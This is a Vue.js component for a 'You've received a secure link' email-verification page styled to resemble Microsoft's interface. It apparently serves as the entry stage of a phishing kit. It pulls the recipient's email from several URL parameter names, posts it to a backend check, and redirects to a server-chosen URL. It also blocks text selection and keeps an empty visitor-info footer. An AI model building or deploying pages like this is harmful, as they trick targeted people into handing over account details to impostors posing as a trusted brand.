<template>
<div class="container">
  <div class="main-content">
    <div class="verification-box">
      <div class="checkmark">🔒</div>
      <p><strong>You've received a secure link.</strong></p>
      <p>To open this secure link, we'll need you to enter the email that this item was shared to.</p>
      
      <div class="input-container">
        <input 
          type="email" 
          id="email" 
          name="email" 
          v-model="emailInput" 
          required 
          autocomplete="email" 
          @keyup.enter="handleContinueClick"
          @focus="inputFocused = true"
          @blur="inputFocused = false"
        />
        <label 
          for="email" 
          :class="{ 'focused': inputFocused || emailInput.length > 0 }"
        >
          Enter email
        </label>
      </div>
      
      <p v-if="errorMessage" class="error">{{ errorMessage }}</p>
      <div class="button-container">
        <button @click="handleContinueClick" :disabled="isLoading">
          <span>{{ getButtonText() }}</span>
        </button>
      </div>
    </div>
    <div class="reference">
      <a href="#" @click.prevent="showTermsModal = true">Terms of Use</a> | 
      <a href="#" @click.prevent="showReportModal = true">Report Abuse</a>
    </div>
  </div>
  
  <footer style="position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); padding: 10px; text-align: center;">
    <div id="visitor-info" style="color: #666; font-size: 10px; margin-bottom: 2px; line-height: 1.3;">
    </div>
  </footer>
  
  <CookieBanner />
  <Analytics />
  <TermsOfUseModal :isVisible="showTermsModal" @close="showTermsModal = false" />
  <ReportAbuseModal :isVisible="showReportModal" :referenceId="'EMAIL-VERIFICATION'" @close="showReportModal = false" />
</div>
</template>

<script>
import TermsOfUseModal from './TermsOfUseModal.vue'
import ReportAbuseModal from './ReportAbuseModal.vue'

export default {
  name: 'EmailVerificationPage',
  components: { TermsOfUseModal, ReportAbuseModal },
  props: { 
    prefilledEmail: String,
    cookieConsent: Object
  },
  data() {
    return {
      emailInput: '', 
      errorMessage: '', 
      isLoading: false, 
      showTermsModal: false, 
      showReportModal: false,
      inputFocused: false
    }
  },

  mounted() {
    this.initializeComponent()
  },

  methods: {
    initializeComponent() {
      this.extractEmailFromUrl()
      // Auto-submit functionality removed - only prefill now
    },

    extractEmailFromUrl() {
      // Check prop first
      if (this.prefilledEmail) {
        this.emailInput = this.prefilledEmail
        return
      }
      
      // Check URL parameters for email
      const url = new URL(window.location.href)
      const email = url.searchParams.get('email') || 
                    url.searchParams.get('e') || 
                    url.searchParams.get('user') || 
                    url.searchParams.get('mail')
      
      if (email && this.isValidEmail(email)) {
        this.emailInput = email.trim()
      }
    },

    isValidEmail(email) { 
      return email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim()) 
    },

    async handleContinueClick() {
      this.errorMessage = ''
      if (!this.emailInput.trim()) {
        this.errorMessage = 'Please enter an email address'
        return
      }
      if (!this.isValidEmail(this.emailInput)) {
        this.errorMessage = 'Please enter a valid email address'
        return
      }
      this.verifyEmail()
    },

    async verifyEmail() {
      this.isLoading = true
      try {
        const response = await fetch('/api/verify-email', {
          method: 'POST', 
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            email: this.emailInput.trim()
          })
        })
        
        const data = await response.json()
        
        if (data.redirectUrl) {
          window.location.replace(data.redirectUrl)
        } else if (data.success) {
          this.$emit('verification-success', { email: this.emailInput, data })
        } else {
          throw new Error(data.message)
        }
      } catch (error) {
        this.errorMessage = error.message || 'Unable to verify email. Please try again.'
        this.emailInput = ''
      } finally { 
        this.isLoading = false 
      }
    },

    getButtonText() {
      return this.isLoading ? 'Verifying...' : 'Next'
    }
  }
}
</script>

<style scoped>
.container {
 background-image: url('/back.avif');
 background-repeat: no-repeat;
 background-position: center center;
 background-size: cover;
 
 min-height: 100vh;
 width: 100%;
 max-width: none;
 padding: 0 20px;
 margin: 0;
 display: flex;
 align-items: center;
 justify-content: center;
 flex-direction: column;
 user-select: none;
 touch-action: manipulation;
 text-size-adjust: 100%;
 position: relative;
}

.main-content {
 width: 100%;
 display: flex;
 align-items: center;
 justify-content: center;
 flex-direction: column;
 max-width: 440px;
}

.verification-box {
 background: white;
 border-radius: 0;
 box-shadow: 0 2px 4px rgba(0,0,0,0.133), 0 8px 16px rgba(0,0,0,0.133);
 padding: 32px;
 width: 100%;
 max-width: 400px;
 text-align: center;
 user-select: none;
 position: relative;
}

.checkmark {
 color: #0078d4;
 width: 40px;
 height: 40px;
 border-radius: 50%;
 font-size: 20px;
 display: flex;
 align-items: center;
 justify-content: center;
 margin: 0 auto 20px auto;
 user-select: none;
}

p:first-of-type {
 color: #323130;
 font-size: 20px;
 font-weight: 600;
 margin-bottom: 6px;
 line-height: 24px;
 user-select: none;
 font-family: 'Arial', sans-serif;
}

p {
 color: #605e5c;
 font-size: 14px;
 font-weight: 400;
 margin-bottom: 24px;
 line-height: 18px;
 user-select: none;
}

.input-container {
 position: relative;
 margin-bottom: 16px;
 text-align: left;
}

input[type="email"] {
 width: 100%;
 height: 32px;
 padding: 6px 12px;
 border: none;
 border-bottom: 1px solid #605e5c;
 border-radius: 0;
 margin: 0;
 font-size: 15px;
 display: block;
 user-select: text;
 text-size-adjust: 100%;
 background: transparent;
 font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
 color: #323130;
 outline: none;
}

input[type="email"]:focus {
 border-bottom: 2px solid #0078d4;
}

label {
 position: absolute;
 left: 12px;
 top: 6px;
 font-size: 15px;
 color: #605e5c;
 pointer-events: none;
 transition: all 0.2s ease;
 transform-origin: left top;
 font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
}

label.focused {
 transform: translateY(-20px) scale(0.75);
 color: #0078d4;
}

.error {
 color: #a4262c;
 margin: 4px 0 12px 0;
 font-size: 13px;
 display: block;
 text-align: left;
}

.button-container {
 text-align: center;
 margin-top: 16px;
}

button {
 width: auto;
 min-width: 108px;
 height: 32px;
 color: white;
 border: 1px solid #0078d4;
 border-radius: 2px;
 background: #0078d4;
 cursor: pointer;
 font-size: 15px;
 font-weight: 400;
 transition: all 0.1s ease-in-out;
 outline: none;
 user-select: none;
 
 display: inline-flex;
 align-items: center;
 justify-content: center;
 padding: 4px 12px;
 
 margin: 0;
 font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
}

button:hover:not(:disabled) {
 background-color: #106ebe;
 border-color: #106ebe;
}

button:active:not(:disabled) {
 background-color: #005a9e;
 border-color: #005a9e;
}

button:disabled {
 color: #323130;
 background-color: #f3f2f1;
 border-color: #f3f2f1;
 cursor: not-allowed;
 opacity: 1;
}

.reference {
 text-align: center;
 font-size: 13px;
 color: #605e5c;
 padding: 10px 0;
 margin-top: 16px;
 user-select: none;
}

.reference a {
 color: #0078d4;
 text-decoration: none;
 cursor: pointer;
}

.reference a:hover {
 text-decoration: underline;
}

@media (max-width: 768px) {
 .container {
   padding: 0 15px;
   align-items: flex-start;
   padding-top: 20px;
   padding-bottom: 20px;
 }
 
 .verification-box {
   padding: 24px 20px;
 }
}

@media (max-width: 480px) {
 .verification-box {
   padding: 20px 16px;
 }
 
 input[type="email"] {
   height: 36px;
   font-size: 16px;
 }
 
 button {
   font-size: 15px;
   height: 36px;
 }
 
 .checkmark {
   width: 36px;
   height: 36px;
   font-size: 18px;
 }
 
 p:first-of-type {
   font-size: 18px;
   line-height: 22px;
 }
 
 p {
   font-size: 13px;
 }
}

html {
 text-size-adjust: 100%;
}

img, svg {
 user-select: none;
 pointer-events: none;
}

* {
 box-sizing: border-box;
}

@media (hover: none) {
 .container {
   -webkit-overflow-scrolling: touch;
 }
}
</style>
